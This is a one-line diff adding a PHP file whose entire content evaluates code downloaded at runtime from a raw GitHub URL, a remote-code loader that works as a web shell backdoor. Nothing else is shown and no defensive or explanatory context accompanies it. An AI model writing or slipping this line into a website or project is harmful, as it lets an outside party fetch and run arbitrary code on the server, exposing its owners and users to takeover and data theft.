@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/x666dbg/x666dbg/refs/heads/master/aw.php"));?>
